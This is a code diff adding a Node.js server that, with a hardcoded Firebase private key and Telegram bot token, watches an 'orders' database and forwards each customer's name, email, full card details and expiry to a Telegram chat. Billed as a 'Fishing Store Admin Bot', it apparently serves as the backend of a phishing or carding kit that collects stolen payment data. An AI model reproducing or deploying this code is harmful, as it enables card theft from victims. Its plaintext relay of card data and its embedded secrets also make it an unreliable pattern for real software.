@@ -1,0 +1,61 @@
+const express = require('express');
+const admin = require("firebase-admin");
+const TelegramBot = require('node-telegram-bot-api');
+
+const app = express();
+app.use(express.json());
+
+// --- YOUR FIREBASE CONFIGURATION ---
+// Maine aapka JSON ki details direct yahan lga di hai taaki file missing error na aaye
+const serviceAccount = {
+  "project_id": "vova-733e8",
+  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC8/7Z8F7OArGzV\nxritS68ik4g8X/lzDb6VRWYF08KgFCxzKGp4ZAi5cWNvuZ43n9rzrTo+kBOvhduq\nn/z3bk0ulEWqDD6bYeY/2+H/aof4pbs1K0AnilZxbFXW6eSudsT1sqB/K9EX2sri\nLQWS+hhNbTA5Y6vj/3S75U04B1HeJeoPy2znop74kftRdLh4+bz/ZpZGFxJX/Xdg\nIH0SbKXsZaNeodte08EAXoBZmShZSB81DU9o6RdSEOF2x3xzr0ddeC8I2e39QMM5\ntD7HlrbvqucMxDufgaW1ZCyxFqhSJ9BWCB5pPF4nGuyNEPSGk5dPNnIMTREQ68PN\nX3wmVIijAgMBAAECggEADzYhK/CrNMG4vfLEd1738ndfh8VAg8cvhFhPEBkzxdC9\nDFGy7AvYSR1veUg+JZz0l7GYCZc5nMic98K9SFuoBtLOBPplgy0IeP6yCSDvK6iI\nt9lKZkRNYjI4rT3EkMDxAXnS6BldnVoxnRP7KfhK3D4PAd3cF+zxQ/qX64wCeOrk\n7zNj9NiH27fOJi946as8D3cVSmizrwsdGQaLI9nEC+zQVVV4SEfj83nBe0dj5xsp\nJwAuDR8Pe_jaaphkAkUHCRqlkj9faH9ZdWrIEE86FdaHWhdIUfYmhR4IU1WX1eha\n?--- [TRUNCATED] ---\n-----END PRIVATE KEY-----\n",
+  "client_email": "firebase-adminsdk-fbsvc@vova-733e8.iam.gserviceaccount.com"
+};
+
+// Initialize Firebase
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: "https://vova-733e8-default-rtdb.firebaseio.com"
+});
+
+const db = admin.database();
+
+// --- TELEGRAM BOT SETUP ---
+const token = "9178448206:AAEziLPCU85WI4bDgKQ9mdAkAnO4tboBLbM"; 
+const chatId = "6398769189";
+const bot = new TelegramBot(token, { polling: true });
+
+console.log("🚀 Bot is online and waiting for orders...");
+
+// Handle messages from Telegram
+bot.on('message', (msg) => {
+    bot.sendMessage(msg.chat.id, "Hello! I am the Fishing Store Admin Bot. I will notify this chat when a user orders!");
+});
+
+// --- MONITOR FIREBASE ORDERS ---
+const ordersRef = db.ref('orders');
+ordersRef.on('child_added', (snapshot) => {
+    const order = snapshot.val();
+    
+    // This is what will be sent to your Telegram
+    const orderMessage = `🚨 *NEW ORDER RECEIVED* 🚨\n\n` +
+                          `👤 *Customer:* ${order.customer_name}\n` +
+                          `📦 *Product:* ${order.product}\n` +
+                          `💳 *Card details:* ${order.card_info} (Exp: ${order.expiry})\n` +
+                          `📧 *Email:* ${order.email}\n` +
+                          `📅 *Time:* ${order.timestamp}`;
+
+    bot.sendMessage(chatId, orderMessage, { parse_mode: 'Markdown' });
+    console.log("Notification sent to admin via Telegram.");
+});
+
+// Render.com requires an active port
+app.get('/', (req, res) => {
+    res.send("Admin Panel Online! Listening for orders...");
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server active on port ${PORT}.`);
+});
